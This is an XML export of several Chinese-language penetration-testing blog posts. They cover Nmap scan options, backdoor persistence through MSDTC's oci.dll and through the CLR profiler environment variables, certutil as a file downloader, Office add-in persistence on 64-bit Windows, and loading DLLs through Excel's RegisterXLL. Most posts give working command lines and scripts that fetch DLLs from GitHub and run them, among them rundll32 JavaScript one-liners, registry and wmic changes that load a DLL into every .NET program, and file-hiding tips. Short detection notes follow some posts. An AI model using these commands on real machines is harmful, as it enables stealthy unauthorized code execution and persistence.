TCP connect scan(-sT) 完成三次握手过程（SYN，SYN/ACK，ACK），当然，速度会降低 容易被检测 Udp scan(-sU) 扫描UDP端口 TCP Null/FIN/Xmas scan(-sN/-sF/-sX) 用来判断端口是否开放 能够绕过一些无状态防火墙 Null scan (-sN) 不设置任何标志位(tcp标志头是0) FIN scan (-sF) 只设置TCP FIN标志位 Xmas scan (-sX) 设置FIN，PSH，和URG标志位 TCP ACK scan(-sA) 不用于确定端口是否开放 用于发现防火墙规则，确定防火墙规则是有状态的还是无状态的，哪些端口是被过滤的 只设置ACK标志位 Custom TCP scan(–scanflags) 手动指定任意TCP标志位来设计自定义扫描 可用于绕过入侵检测系统 需要对通信协议有深入的理解 Idle scan(-sI) 伪造扫描源地址 注： 该源地址主机必须在线 也可伪造源端口，默认为80端口 伪造源端口格式如下： &lt;zombie host[:probeport]&gt; 实例： nmap.exe -sI 192.168.81.1：1234 192.168.81.143 PING Scan(-sP) 使用ping来扫描主机是否在线 No PING Scan(-PN) 不用ping进行扫描 注： PN两个字母大写 输出格式： -oN &lt;filespec&gt; (标准) -oX &lt;filespec&gt; (XML) -oS &lt;filespec&gt; (ScRipT KIdd|3 oUTpuT) nmap默认输出均为大写格式，使用-oS会随机改写字母大小写 -oG &lt;filespec&gt; (Grep) -oA &lt;basename&gt; (输出至所有格式) 设置文件名称，一次性输出标准(.nmap)、XML(.xml)和Grep(.gnmap)三种格式的文件 注： https://nmap.org/book/可获得更多Nmap使用介绍 0x06 小结 本文介绍了Windows平台下命令行使用Masscan和Nmap的方法，同时站在防御的角度提醒大家，内网安全同样重要，要谨慎对待。 LEAVE A REPLY]]></content>
  </entry>
  <entry>
    <title><![CDATA[Use msdtc to maintain persistence]]></title>
    <url>%2Fposts%2F7a232daf.html</url>
    <content type="text"><![CDATA[0x00 前言 Shadow Force曾经在域环境中使用过的一个后门，利用MSDTC服务加载dll，实现自启动，并绕过Autoruns对启动项的检测。本文将要对其进行测试，介绍更多利用技巧，分析防御方法。 0x01 简介 本文将要介绍以下内容： MSDTC简介 后门思路 后门验证 更多测试和利用方法 检测防御 0x02 MSDTC简介 MSDTC： 对应服务MSDTC，全称Distributed Transaction Coordinator，Windows系统默认启动该服务 对应进程msdtc.exe,位于%windir%\system32\ msdtc.exe是微软分布式传输协调程序，该进程调用系统Microsoft Personal Web Server和Microsoft SQL Server 0x03 后门思路 参考链接： http://blog.trendmicro.com/trendlabs-security-intelligence/shadow-force-uses-dll-hijacking-targets-south-korean-company/ 文中介绍的思路如下： 当计算机加入域中，MSDTC服务启动时，会搜索注册表HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\MSDTC\MTxOCI 如下图 分别加载3个dll：oci.dll,SQLLib80.dll,xa80.dll 然而特别的是，Windows系统默认不包含oci.dll 也就是说，将payload.dll重名为oci.dll并保存在%windir%\system32\下 域中的计算机启动服务MSDTC时就会加载该dll，实现代码执行 0x04 后门验证 测试系统： Win7 x64 搭建域环境，如下图 使用Procmon监控msdtc的启动过程，筛选进程msdtc.exe，查看文件操作，如下图 msdtc.exe确实会尝试加载oci.dll，并且由于系统默认不存在oci.dll,导致加载失败 使用64位的测试dll,下载地址如下： https://github.com/3gstudent/test/blob/master/calc_x64.dll 将其保存在%windir%\system32\下 结束进程msdtc.exe，命令行参数如下： taskkill /f /im msdtc.exe 等待msdtc.exe重新启动 等待一段时间，mstdc.exe重新启动,成功加载oci.dll，如下图 calc.exe以system权限启动 如下图 经实际测试，该方法偶尔会出现bug，通过taskkill结束进程后，msdtc.exe并不会重新启动 解决方法： 重新启动服务MSDTC就好，命令行参数如下： net start msdtc 0x05 更多测试 1、测试32位系统32位系统换用32位dll就好，下载地址如下： https://github.com/3gstudent/test/blob/master/calc.dll 2、测试64位系统64位系统，虽然SysWOW64文件夹下也包含32位的msdtc.exe，但是MSDTC服务只启动64位的msdtc.exe 因此，不支持32位oci.dll的加载 3、通用测试经实际测试，MSDTC服务不是域环境特有，工作组环境下默认也会启动MSDTC服务 也就是说，该利用方法不仅适用于域环境，工作组环境也同样适用 4、以管理员权限加载oci.dll（降权启动）上述方法会以system权限加载oci.dll，提供一个以管理员权限加载oci.dll（降权启动）的方法： 管理员权限cmd执行： msdtc -install 启动的calc.exe为high权限，如下图 注： 关于为什么要降权及降权的更多实现方式可参照文章 《渗透技巧——程序的降权启动》 0x06 检测防御 检测：检测%windir%\system32\是否包含可疑oci.dll 防御：对于普通用户主机，建议禁用服务MSDTC 0x07 小结 本文介绍了MSDTC的相关利用技巧，不仅能用作后门，同样可用于程序的降权启动。 LEAVE A REPLY]]></content>
  </entry>
  <entry>
    <title><![CDATA[Use CLR to maintain persistence]]></title>
    <url>%2Fposts%2F5b866ca7.html</url>
    <content type="text"><![CDATA[0x00 前言 在之前的文章《Use AppDomainManager to maintain persistence》介绍了通过AppDomainManager实现的一种被动后门触发机制，演示了如何劫持系统.Net程序powershell_ise.exe，但前提是需要获得管理员权限。这一次将更进一步，介绍一种无需管理员权限的后门，并能够劫持所有.Net程序。 0x01 简介 本文将要介绍以下内容： CLR的使用 后门开发思路 POC编写 后门检测 0x02 CLR的使用 CLR： 全称Common Language Runtime（公共语言运行库），是一个可由多种编程语言使用的运行环境。 CLR是.NET Framework的主要执行引擎，作用之一是监视程序的运行： 在CLR监视之下运行的程序属于“托管的”（managed）代码 不在CLR之下、直接在裸机上运行的应用或者组件属于“非托管的”（unmanaged）的代码 CLR的使用： 测试系统： Win8 x86 1、启动cmd输入如下代码： SET COR_ENABLE_PROFILING=1 SET COR_PROFILER={11111111-1111-1111-1111-111111111111} 注： {11111111-1111-1111-1111-111111111111}表示CLSID 可设置为任意数值，只要不和系统常用CLSID冲突就好 2、测试dll使用弹框dll，下载地址： https://raw.githubusercontent.com/3gstudent/test/master/msg.dll dll开发过程可参考： https://3gstudent.github.io/3gstudent.github.io/Use-Office-to-maintain-persistence/ 可在cmd下实现直接下载，代码如下： certutil.exe -urlcache -split -f https://raw.githubusercontent.com/3gstudent/test/master/msg.dll certutil.exe -urlcache -split -f https://raw.githubusercontent.com/3gstudent/test/master/msg.dll delete 操作如下图 注： delete是为了清除下载文件的缓存 更多关于使用certutil.exe下载文件的利用细节可参考文章： 《渗透测试中的certutil.exe》 3、操作注册表注册表路径：HKEY_CURRENT_USER\Software\Classes\CLSID\ 新建子项{11111111-1111-1111-1111-111111111111}，同步骤1 cmd输入的CLSID对应新建子项InProcServer32新建键值REG_SZ ThreadingModel：Apartment默认路径改为msg.dll的路径 修改后的注册表如下图 对应cmd代码如下： SET KEY=HKEY_CURRENT_USER\Software\Classes\CLSID\{11111111-1111-1111-1111-111111111111}\InProcServer32 REG.EXE ADD %KEY% /VE /T REG_SZ /D &quot;%CD%\msg.dll&quot; /F REG.EXE ADD %KEY% /V ThreadingModel /T REG_SZ /D Apartment /F 4、在当前cmd启动.net程序例如powershell.exe，启动时加载msg.dll，弹框 操作如下图 注: 使用其他cmd执行powershell.exe不会加载msg.dll 原因： SET COR_ENABLE_PROFILING=1 SET COR_PROFILER={11111111-1111-1111-1111-111111111111} 只作用于当前cmd，可通过cmd命令&quot;set&quot;判断 当然，执行其他.net程序也会加载msg.dll 测试如下图 0x03 后门开发思路 由以上测试得出结论，使用CLR能够劫持所有.Net程序的启动，但是只能作用于当前cmd 能否作用于全局呢？ 自然想到了修改环境变量 通常，修改环境变量使用面板操作的方式，如下图 能否通过命令行修改环境变量呢？ 自然想到了WMI 修改系统变量（需要管理员权限）： wmic ENVIRONMENT create name=&quot;1&quot;,username=&quot;&lt;system&gt;&quot;,VariableValue=&quot;1&quot; 修改当前用户变量（当前用户权限）： wmic ENVIRONMENT create name=&quot;2&quot;,username=&quot;%username%&quot;,VariableValue=&quot;2&quot; 注： 通过WMI修改环境变量需要系统重启或注销重新登录才能生效 接下来需要测试，是否只需要修改当前用户权限就能够实现作用于全局，答案是肯定的。 添加当前用户的环境变量： wmic ENVIRONMENT create name=&quot;COR_ENABLE_PROFILING&quot;,username=&quot;%username%&quot;,VariableValue=&quot;1&quot; wmic ENVIRONMENT create name=&quot;COR_PROFILER&quot;,username=&quot;%username%&quot;,VariableValue=&quot;{11111111-1111-1111-1111-111111111111}&quot; 重启后，成功修改，如下图 现在直接启动.Net程序，弹框，成功加载msg.dll 如下图 至此，后门思路验证成功 0x04 POC编写 对于32位操作系统，参考0x03的代码就好，x86 POC如下： wmic ENVIRONMENT create name=&quot;COR_ENABLE_PROFILING&quot;,username=&quot;%username%&quot;,VariableValue=&quot;1&quot; wmic ENVIRONMENT create name=&quot;COR_PROFILER&quot;,username=&quot;%username%&quot;,VariableValue=&quot;{11111111-1111-1111-1111-111111111111}&quot; certutil.exe -urlcache -split -f https://raw.githubusercontent.com/3gstudent/test/master/msg.dll certutil.exe -urlcache -split -f https://raw.githubusercontent.com/3gstudent/test/master/msg.dll delete SET KEY=HKEY_CURRENT_USER\Software\Classes\CLSID\{11111111-1111-1111-1111-111111111111}\InProcServer32 REG.EXE ADD %KEY% /VE /T REG_SZ /D &quot;%CD%\msg.dll&quot; /F REG.EXE ADD %KEY% /V ThreadingModel /T REG_SZ /D Apartment /F 对应64位系统，需要注意重定向问题，注册表存在32位和64位两个位置 注: 更多关于64位系统的重定向细节可参考文章《关于32位程序在64位系统下运行中需要注意的重定向问题》 结合到本文，32位需要对应32位的dll，64位对应64位的dll 所以，需要准备64位的dll，下载地址如下： https://raw.githubusercontent.com/3gstudent/test/master/msg_x64.dll 过程不再赘述，64位POC如下： wmic ENVIRONMENT create name=&quot;COR_ENABLE_PROFILING&quot;,username=&quot;%username%&quot;,VariableValue=&quot;1&quot; wmic ENVIRONMENT create name=&quot;COR_PROFILER&quot;,username=&quot;%username%&quot;,VariableValue=&quot;{11111111-1111-1111-1111-111111111111}&quot; certutil.exe -urlcache -split -f https://raw.githubusercontent.com/3gstudent/test/master/msg.dll certutil.exe -urlcache -split -f https://raw.githubusercontent.com/3gstudent/test/master/msg.dll delete certutil.exe -urlcache -split -f https://raw.githubusercontent.com/3gstudent/test/master/msg_x64.dll certutil.exe -urlcache -split -f https://raw.githubusercontent.com/3gstudent/test/master/msg_x64.dll delete SET KEY=HKEY_CURRENT_USER\Software\Classes\CLSID\{11111111-1111-1111-1111-111111111111}\InProcServer32 REG.EXE ADD %KEY% /VE /T REG_SZ /D &quot;%CD%\msg_x64.dll&quot; /F REG.EXE ADD %KEY% /V ThreadingModel /T REG_SZ /D Apartment /F SET KEY=HKEY_CURRENT_USER\Software\Classes\WoW6432Node\CLSID\{11111111-1111-1111-1111-111111111111}\InProcServer32 REG.EXE ADD %KEY% /VE /T REG_SZ /D &quot;%CD%\msg.dll&quot; /F REG.EXE ADD %KEY% /V ThreadingModel /T REG_SZ /D Apartment /F 能够分别劫持32位和64位的.Net程序，完整测试如下图 注： 更多代码细节可见github，地址如下： https://github.com/3gstudent/CLR-Injection 0x05 后门检测 结合利用方式，检测方法如下： 检查环境变量COR_ENABLE_PROFILING和COR_PROFILER 检查注册表键值HKEY_CURRENT_USER\Software\Classes\CLSID\ 0x06 小结 本文介绍了通过CLR劫持.Net程序的后门，特点是无需管理员权限，并能够劫持所有.Net程序。更重要的是,系统默认会调用.net程序,导致后门自动触发。 0x07 补充(20171023)Stefan Kanthak发现了这种利用方法，并且公开的时间比我要早，地址如下： http://seclists.org/fulldisclosure/2017/Jul/11 并且，他利用CLR还实现了UAC绕过(这个思路我是后来从clem@clavoillotte的博客学到的)，该方法我也做了研究并写了一篇研究心得，地址如下： 《Use CLR to bypass UAC》 LEAVE A REPLY]]></content>
  </entry>
  <entry>
    <title><![CDATA[渗透测试中的certutil]]></title>
    <url>%2Fposts%2F481179e7.html</url>
    <content type="text"><![CDATA[0x00 前言 最近在Casey Smith‏ @subTee的twitter上学到了关于certutil的一些利用技巧。本文将结合自己的一些经验，介绍certutil在渗透测试中的应用，对cmd下downloader的实现方法作补充，总结base64编码转换的常用方法。 学习地址： https://twitter.com/subTee/status/888101536475344896 https://twitter.com/subTee/status/888071631528235010 0x01 简介 本文将要介绍以下内容： certutil.exe在渗透测试中的应用 downloader常用方法 base64编码转换常用方法 0x02 certutil简介 用于证书管理 支持xp-win10 更多操作说明见https://technet.microsoft.com/zh-cn/library/cc755341(v=ws.10).aspx 注： 在之前的文章《域渗透——EFS文件解密》有用过certutil.exe导入证书 0x03 渗透测试中的应用 1、downloader(1) 保存在当前路径，文件名称同URL eg： certutil.exe -urlcache -split -f https://raw.githubusercontent.com/3gstudent/test/master/version.txt (2) 保存在当前路径，指定保存文件名称 eg： certutil.exe -urlcache -split -f https://raw.githubusercontent.com/3gstudent/test/master/version.txt file.txt (3) 保存在缓存目录，名称随机 缓存目录位置： %USERPROFILE%\AppData\LocalLow\Microsoft\CryptnetUrlCache\Content eg： certutil.exe -urlcache -f https://raw.githubusercontent.com/3gstudent/test/master/version.txt (4) 支持保存二进制文件 eg： certutil.exe -urlcache -split -f https://raw.githubusercontent.com/3gstudent/test/master/msg.dll 注： 使用downloader默认在缓存目录位置： %USERPROFILE%\AppData\LocalLow\Microsoft\CryptnetUrlCache\Content保存下载的文件副本 清除下载文件副本方法： 方法1： 直接删除缓存目录对应文件 如下图 方法2： 命令行: certutil.exe -urlcache -split -f https://raw.githubusercontent.com/3gstudent/test/master/msg.dll delete 补充： 查看缓存项目： certutil.exe -urlcache * 如下图 实际测试： 测试系统安装Office软件，下载执行dll对应的powershell代码如下： $path=&quot;c:\test\msg1.dll&quot; certutil.exe -urlcache -split -f https://raw.githubusercontent.com/3gstudent/test/master/msg.dll $path $excel = [activator]::CreateInstance([type]::GetTypeFromProgID(&quot;Excel.Application&quot;)) $excel.RegisterXLL($path) 测试如下图 2、计算文件hash(1) SHA1 certutil.exe -hashfile msg.dll (2) SHA256： certutil.exe -hashfile msg.dll SHA256 (3) MD5： certutil.exe -hashfile msg.dll MD5 3、base64编码转换(1) base64编码： CertUtil -encode InFile OutFile (2) base64解码 CertUtil -decode InFile OutFile 注： 编码后的文件会添加两处标识信息： 文件头： -----BEGIN CERTIFICATE----- 文件尾： -----END CERTIFICATE----- 如下图 0x04 downloader常用方法 在之前的文章《渗透技巧——通过cmd上传文件的N种方法》整理过常用的cmd下downloader方法，相比来说，利用certUtil简便快捷，但是使用后需要注意清除缓存，路径如下： %USERPROFILE%\AppData\LocalLow\Microsoft\CryptnetUrlCache\Content downloader常用方法如下： certUtil powershell csc vbs JScript hta bitsadmin wget debug ftp ftfp 0x05 base64编码转换常用方法 在编写脚本操作二进制文件时，常常会因为不可见字符报错，所以通常会选择先对二进制文件作base64编码再操作，最后通过解码还原出二进制文件。 所以在此整理一下常用不同开发工具对应的base64编码转换方式 1、powershellbase64编码： $PEBytes = [System.IO.File]::ReadAllBytes(&quot;C:\windows\system32\calc.exe&quot;) $Base64Payload = [System.Convert]::ToBase64String($PEBytes) Set-Content base64.txt -Value $Base64Payload base64解码： $Base64Bytes = Get-Content (&quot;base64.txt&quot;) $PEBytes= [System.Convert]::FromBase64String($Base64Bytes) [System.IO.File]::WriteAllBytes(&quot;calc.exe&quot;,$PEBytes) 2、C SHARP（c#）base64编码： using System.IO; byte[] AsBytes = File.ReadAllBytes(@&quot;C:\windows\system32\calc.exe&quot;); String AsBase64String = Convert.ToBase64String(AsBytes); StreamWriter sw = new StreamWriter(@&quot;C:\test\base64.txt&quot;); sw.Write(AsBase64String); sw.Close(); base64解码： using System.IO; String AsString = File.ReadAllText(@&quot;C:\test\base64.txt&quot;); byte[] bytes = Convert.FromBase64String(AsString); FileStream fs = new FileStream(@&quot;C:\test\calc.exe&quot;, FileMode.Create); fs.Write(bytes, 0, bytes.Length); fs.Flush(); fs.Close(); 注： 在之前的文章《渗透技巧——通过cmd上传文件的N种方法》存在两处bug “ 解密base64文件并生成exe的方法： ” 其中的powershell代码和c#代码存在bug，修正的代码以本文为准 3、jsbase64解码： fso1=new ActiveXObject(&quot;Scripting.FileSystemObject&quot;); f=fso1.OpenTextFile(&quot;C:\\test\\base64.txt&quot;,1); base64string=f.ReadAll(); f.Close(); enc = new ActiveXObject(&quot;System.Text.ASCIIEncoding&quot;); length = enc.GetByteCount_2(base64string); ba = enc.GetBytes_4(base64string); transform = new ActiveXObject(&quot;System.Security.Cryptography.FromBase64Transform&quot;); ba = transform.TransformFinalBlock(ba, 0, length); s=new ActiveXObject(&quot;ADODB.Stream&quot;); s.Type=1; s.Open(); s.Write(ba); s.SaveToFile(&quot;C:\\test\\calc.exe&quot;,2); 4、certutilbase64编码： CertUtil -encode InFile OutFile base64解码： CertUtil -decode InFile OutFile 注： 编码后的文件会添加两处标识信息： 文件头： —–BEGIN CERTIFICATE—– 文件尾： —–END CERTIFICATE—– 0x06 检测downloader 查看利用certUtil下载文件的缓存记录： certutil.exe -urlcache * 缓存文件位置： %USERPROFILE%\AppData\LocalLow\Microsoft\CryptnetUrlCache\Content 0x07 小结 本文介绍了certutil在渗透测试中的应用，详细介绍利用certutil作downloader的实现方法和检测方法，最后总结了base64编码转换的常用方法。 LEAVE A REPLY]]></content>
  </entry>
  <entry>
    <title><![CDATA[Office Persistence on x64 operating system]]></title>
    <url>%2Fposts%2F8e20720a.html</url>
    <content type="text"><![CDATA[0x00 前言 在之前的文章《Use Office to maintain persistence》介绍了在Office软件中植入后门的常用方法，但并不全面，缺少64位系统的测试。而对于64位操作系统，支持32位和64位两个版本的office软件，不同office版本的利用方法是否不同呢？本文将要给出答案。 0x01 简介 本文将要介绍如下内容： 64位系统安装64位Office软件的利用方法 64位系统安装32位Office软件的利用方法 根据测试结果优化POC 0x02 64位系统安装64位Office软件的利用方法 测试系统： Win8 x64 开发工具：vs2012 注： 32位系统下安装vs2012支持生成64位的dll 默认主要文件安装目录：C:\Program Files\Microsoft Office 1、Word WLL32位dll，无法加载 64位dll，成功加载 2、Excel XLL32位dll，无法加载 64位dll，成功加载 注： 添加导出函数xlAutoOpen的方法： 1、使用传统的模块定义文件 (.def) 新建dll工程，不选择导出符号 如下图 添加同名文件.def，内容如下： EXPORTS xlAutoOpen 如下图 编译成dll，使用IDA查看导出函数 显示正常 如下图 2、使用vs2012提供的便捷方法 新建dll工程，选择导出符号 如下图 设置导出函数为xlAutoOpen 如下图 编译成dll，使用IDA查看导出函数 如下图 导出函数名发生变化，改变为?xlAutoOpen@@YAXXZ Excel无法加载该dll，原因是无法识别该导出函数（函数名发生变化） 解决方法： 使用预处理指示符#pragma指定链接选项，修正导出函数名称 添加一行代码： #pragma comment(linker, &quot;/EXPORT:xlAutoOpen=?xlAutoOpen@@YAXXZ&quot;) 如下图 再次使用IDA查看导出函数，显示正常 如下图 Excel成功加载该dll，修改成功 注： 已将两种方法的vs工程上传至github，地址如下： https://github.com/3gstudent/Add-Dll-Exports 方法1对应DllExport(Def) 方法2对应DllExport(declspec) 3、Excel VBA add-ins使用32位的模板即可 4、PowerPoint VBA add-ins使用32位的模板即可 结论： 如果在64位系统安装了64位的Office软件，那么Word WLL需要使用64位的calc.wll，Excel XLL需要使用64位的calc.xll 0x03 64位系统安装32位Office软件的利用方法 默认主要文件安装目录：C:\Program Files (x86)\Microsoft Office，存在重定向 注： 在目录C:\Program Files\也会创建Office目录，包含软件版本 也就是说，原POC中判断Microsoft Office版本的代码不需要更改 注册表位置HKEY_CURRENT_USER\Software\Microsoft\Office\ 并未被重定向至HKEY_CURRENT_USER\Software\Wow6432Node\Microsoft\Office\ 更多关于32位程序在64位系统下的重定向细节可参考之前的文章《关于32位程序在64位系统下运行中需要注意的重定向问题》 1、Word WLL32位dll，成功加载 64位dll，无法加载 同64位office的结果相反 2、Excel XLL32位dll，成功加载 64位dll，无法加载 同64位office的结果相反 3、Excel VBA add-ins使用32位的模板即可 4、PowerPoint VBA add-ins使用32位的模板即可 结论： 在64位系统安装32位Office软件，同32位系统测试结果相同，POC无需修改 0x04 优化POC 综合以上测试结论，为了使得POC支持64位系统，需要作如下修改： 判断操作系统位数，如果是64位，并且安装64位office软件，方法Word WLL和Excel XLL需要使用64位的dll 代码开发注意的细节(powershell代码)： 1、判断操作系统位数if ([Environment]::Is64BitOperatingSystem) { &#39;64-bit&#39; } else { &#39;32-bit&#39; } 2、判断安装office软件版本通过查看默认主要安装路径： 32位office： C:\Program Files (x86)\Microsoft Office 64位office： C:\Program Files\Microsoft Office 判断路径C:\Program Files\Microsoft Office是否包含文件夹MEDIA 如果包含，那么为64位office powershell代码如下： Try { dir C:\Program Files\Microsoft Office\MEDIA Write-Host &quot;Microsoft Office: 64-bit&quot; } Catch { Write-Host &quot;Microsoft Office: 32-bit&quot; } 结合POC脚本，变量$OfficePath表示设置的office安装路径，默认路径为&quot;C:\Program Files\Microsoft Office\&quot;+&quot;Office*&quot; 为获取路径C:\Program Files\Microsoft Office\MEDIA，需要对变量$OfficePath进行字符串截取和拼接，具体代码为： $OfficeMainPath=$OfficePath.Substring(0,$OfficePath.LastIndexOf(&quot;\&quot;)+1)+&quot;MEDIA&quot; 此时，变量$OfficeMainPath代表路径C:\Program Files\Microsoft Office\MEDIA 3、判断64位系统+64位office，释放对应的64位dll（wll和xll）依旧是通过变量保存作base64编码后的64位wll和xll 将dll文件作base64编码： $fileContent = [System.IO.File]::ReadAllBytes(&#39;calcx64.wll&#39;) $fileContentEncoded = [System.Convert]::ToBase64String($fileContent)| set-content (&quot;calc_x64wllbase64.txt&quot;) $fileContent = [System.IO.File]::ReadAllBytes(&#39;calcx64.xll&#39;) $fileContentEncoded = [System.Convert]::ToBase64String($fileContent)| set-content (&quot;calc_x64xllbase64.txt&quot;) 释放时先做base64解密 $fileContentBytes = [System.Convert]::FromBase64String($fileContent) 最终POC已在github更新，该POC能够区分操作系统和office版本，当遇到64位系统安装64位office的情况时，自动释放64位的dll POC地址如下： https://github.com/3gstudent/Office-Persistence 0x05 小结 本文介绍了64位系统安装不同版本office所对应的不同利用方法，分享了在优化POC时注意的细节，至此完成对该POC的开发，便于测试。 LEAVE A REPLY]]></content>
  </entry>
  <entry>
    <title><![CDATA[Use Excel.Application object's RegisterXLL() method to load dll]]></title>
    <url>%2Fposts%2F8bfd8af5.html</url>
    <content type="text"><![CDATA[0x00 前言 Ryan Hanson‏@ryHanson最近分享了一个技巧，利用Excel.Application object&#39;s RegisterXLL()能够加载dll。我对其分享的POC作了测试，接着做了扩展，添加功能实现远程下载执行，并且分析该方法相关的利用技巧，详细介绍脚本开发中的细节。 0x01 简介 本文将要介绍如下内容： POC测试 添加功能实现远程下载执行 扩展用法1：通过powershell实现 扩展用法2：结合rundll32使用 0x02 POC测试 POC地址如下： https://gist.github.com/ryhanson/227229866af52e2d963cf941af135a52 前提是系统已安装Microsoft Office软件，共提供三种利用方式 1.rundll32rundll32.exe javascript:&quot;\..\mshtml,RunHTMLApplication &quot;;x=new%20ActiveXObject(&#39;Excel.Application&#39;);x.RegisterXLL(&#39;C:\\test\\messagebox.dll&#39;);this.close(); 2.jsvar excel = new ActiveXObject(&quot;Excel.Application&quot;); excel.RegisterXLL(&quot;C:\\test\\messagebox.dll&quot;); 3.powershell$excel = [activator]::CreateInstance([type]::GetTypeFromProgID(&quot;Excel.Application&quot;)) $excel.RegisterXLL(&quot;C:\test\messagebox.dll&quot;) 注： 测试的messagebox.dll来自于：https://github.com/3gstudent/test/blob/master/msg.dll 大小3kb，源代码及编译方法可参照文章《Use Office to maintain persistence》： https://3gstudent.github.io/3gstudent.github.io/Use-Office-to-maintain-persistence/ 0x03 添加功能 Jscript基础知识：1、输出内容 js代码如下： WScript.Echo(&quot;1&quot;); 直接执行js脚本会弹框 cmd执行：cscript.exe msg.js，控制台输出1 2、特殊目录 输出当前用户的临时目录： WScript.Echo(WScript.CreateObject(&quot;WScript.Shell&quot;).Environment(&quot;USER&quot;)(&quot;TEMP&quot;)); 输出Recent目录： WScript.Echo(WScript.CreateObject(&quot;WScript.Shell&quot;).SpecialFolders(&quot;Recent&quot;); 即%AppData%\Microsoft\Windows\Recent（该目录后文会用到） 如下图 添加文件名并输出： WScript.Echo(WScript.CreateObject(&quot;WScript.Shell&quot;).SpecialFolders(&quot;Recent&quot;)+&quot;\\msg.dll&quot;); 对原POC添加功能：1、判断是否安装Microsoft Office 通过判断是否存在Microsoft Office默认安装文件夹实现 查找文件夹： &quot;c:\Program Files\Microsoft Office&quot; 对应js代码如下： var FileSys = WScript.CreateObject(&quot;Scripting.FileSystemObject&quot;); if (FileSys.FolderExists(&quot;c:\\Program Files\\Microsoft Office&quot;)) { WScript.Echo(&quot;[+] Find Microsoft Office.&quot;); } else { WScript.Echo(&quot;[!] I can&#39;t find Microsoft Office!&quot;); } 2、从Github下载dll文件并保存至Recent目录 方式1: 使用Msxml2.XMLHTTP var sGet=new ActiveXObject(&quot;ADODB.Stream&quot;); var xGet=null; xGet=new ActiveXObject(&quot;Msxml2.XMLHTTP&quot;); xGet.Open(&quot;GET&quot;,&quot;https://raw.githubusercontent.com/3gstudent/test/master/calc.dll&quot;,0); xGet.Send(); sGet.Type=1; sGet.Open(); sGet.Write(xGet.ResponseBody); sGet.SaveToFile((WScript.CreateObject(&quot;WScript.Shell&quot;).SpecialFolders(&quot;Recent&quot;)+&quot;\\calc.dll&quot;),2); 方式2: 使用WinHttp.WinHttpRequest.5.1 h=new ActiveXObject(&quot;WinHttp.WinHttpRequest.5.1&quot;); h.Open(&quot;GET&quot;,&quot;https://raw.githubusercontent.com/3gstudent/test/master/calc.dll&quot;,false); h.Send(); s=new ActiveXObject(&quot;ADODB.Stream&quot;); s.Type=1; s.Open(); s.Write(h.ResponseBody); x=new ActiveXObject(&quot;WScript.Shell&quot;).SpecialFolders(&quot;Recent&quot;)+&quot;\\calc.dll&quot;; s.SaveToFile(x，2); 两种js方式均可以，但是在rundll32下使用的话，需要使用方式2，原因如下： 不支持WScript.CreateObject(&quot;WScript.Shell&quot;)，需要换成new%20ActiveXObject(&quot;WScript.Shell&quot;) cmd执行： rundll32.exe javascript:&quot;\..\mshtml.dll,RunHTMLApplication &quot;;xGet=new%20ActiveXObject(&quot;Msxml2.XMLHTTP&quot;);xGet.Open(&quot;GET&quot;,&quot;https://raw.githubusercontent.com/3gstudent/test/master/calc.dll&quot;,0);xGet.Send(); 提示权限不够，如下图 注： 选择保存在Recent目录是为了提高隐蔽性 保存在Recent目录，通过explorer.exe无法查看下载的dll，详情如下图 但在cmd下能够查看下载的dll，详情如下图 在其他目录不存在这个问题，详情如下图 为保证js和rundll32利用代码格式对应，原js代码作相应优化，最终代码为： FileSys = WScript.CreateObject(&quot;Scripting.FileSystemObject&quot;); if (FileSys.FolderExists(&quot;c:\\Program Files\\Microsoft Office&quot;)) { WScript.Echo(&quot;[+] Find Microsoft Office.&quot;); WScript.Echo(&quot;[+] Download file...&quot;); h=new ActiveXObject(&quot;WinHttp.WinHttpRequest.5.1&quot;); h.Open(&quot;GET&quot;,&quot;https://raw.githubusercontent.com/3gstudent/test/master/calc.dll&quot;,false); h.Send(); s=new ActiveXObject(&quot;ADODB.Stream&quot;); s.Type=1; s.Open(); s.Write(h.ResponseBody); x=new ActiveXObject(&quot;WScript.Shell&quot;).SpecialFolders(&quot;Recent&quot;)+&quot;\\calc.dll&quot;; s.SaveToFile(x,2); WScript.Echo(&quot;[+] Download Success.&quot;); WScript.Echo(&quot;[+] Load dll...&quot;); e= new ActiveXObject(&quot;Excel.Application&quot;); e.RegisterXLL(x); WScript.Echo(&quot;[+] Load dll Success.&quot;); } else { WScript.Echo(&quot;[!] I can&#39;t find Microsoft Office!&quot;); } 注： 相关代码已上传至Github，完整POC可参照： https://github.com/3gstudent/ExcelDllLoader 0x04 扩展用法 1、通过powershell实现$path=$env:APPDATA+&quot;\Microsoft\Windows\Recent\calc.dll&quot; $client = new-object System.Net.WebClient $client.DownloadFile(&#39;https://raw.githubusercontent.com/3gstudent/test/master/calc.dll&#39;, $path) $excel = [activator]::CreateInstance([type]::GetTypeFromProgID(&quot;Excel.Application&quot;)) $excel.RegisterXLL($path) 注： 该代码缺少判断MicrosoftOffice是否安装的功能 2、结合rundll32使用需要注意如下细节： 空格用%20表示 为避免执行后弹框，需要加入语句document.write(); 否则，如下图 使用ADODB.Stream保存文件，会报错,测试代码如下： rundll32.exe javascript:&quot;\..\mshtml,RunHTMLApplication &quot;;document.write();h=new%20ActiveXObject(&quot;WinHttp.WinHttpRequest.5.1&quot;);h.Open(&quot;GET&quot;,&quot;https://raw.githubusercontent.com/3gstudent/test/master/calc.dll&quot;,false);h.Send();s=new%20ActiveXObject(&quot;ADODB.Stream&quot;);s.Type=1;s.Open();s.Write(h.ResponseBody);x=new%20ActiveXObject(&quot;WScript.Shell&quot;).SpecialFolders(&quot;Recent&quot;)+&quot;\\calc.dll&quot;;s.SaveToFile(x,2); 提示因为安全设置导致无法保存文件，如下图 换用Scripting.FileSystemObject，能够保存文本文件，但是不支持二进制文件 保存文本文件,测试代码如下： rundll32.exe javascript:&quot;\..\mshtml,RunHTMLApplication &quot;;document.write();h=new%20ActiveXObject(&quot;WinHttp.WinHttpRequest.5.1&quot;);h.Open(&quot;GET&quot;,&quot;https://raw.githubusercontent.com/3gstudent/test/master/version.txt&quot;,false);h.Send();s=new%20ActiveXObject(&quot;Scripting.FileSystemObject&quot;);f=s.CreateTextFile(&quot;c:\\test\\1.txt&quot;,true);f.WriteLine(h.ResponseText);f.Close(); 保存二进制文件，测试代码如下： rundll32.exe javascript:&quot;\..\mshtml,RunHTMLApplication 